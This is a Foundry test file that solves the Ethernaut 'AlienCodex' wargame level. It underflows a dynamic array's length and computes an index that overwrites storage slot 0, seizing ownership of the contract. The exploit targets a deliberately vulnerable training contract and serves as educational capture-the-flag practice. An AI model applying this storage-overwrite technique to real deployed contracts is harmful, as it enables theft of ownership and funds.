pragma solidity ^0.8.19;

import { Test } from "forge-std/Test.sol";
import { Ethernaut } from "src/Ethernaut.sol";
import "forge-std/console2.sol";

interface AlienCodexInterface {
    function make_contact() external;
    function contact() external view returns (bool);
    function retract() external;
    function revise(uint256 i, bytes32 content) external;
    function owner() external view returns (address);
}

contract AlienCodexTest is Test {
    Ethernaut ethernaut;
    address me = makeAddr("me");

    function setUp() external {
        ethernaut = new Ethernaut();
    }

    function testAlienCodexHack() external {
        bytes memory bytecode = abi.encodePacked(vm.getCode("./src/AlienCodex/AlienCodex.json"));
        address alienCodex;

        // level needs to be deployed this way as it only works with 0.5.0 solidity version
        assembly {
            alienCodex := create(0, add(bytecode, 0x20), mload(bytecode))
        }

        AlienCodexInterface alienInterface = AlienCodexInterface(alienCodex);
        vm.startPrank(tx.origin);

        address currentOwner = alienInterface.owner();
        console2.log("Current owner = %s", currentOwner);

        alienInterface.make_contact();
        assert(alienInterface.contact());

        // alien codex storage slot 0 - (owner + contact)
        // storage slot 1 - codex
        alienInterface.retract();

        // codex array new length = 2*256 - 1
        // storage slot at index i in codex array = keccak256(1) + i
        // so we need to find i so uint(keccak256(1)) + i = 0
        uint256 slot0Index;
        unchecked {
            slot0Index = uint256(0) - uint256(keccak256(abi.encode(1)));
        }

        alienInterface.revise(slot0Index, bytes32(abi.encode(tx.origin)));

        assertEq(alienInterface.owner(), tx.origin);
    }
}
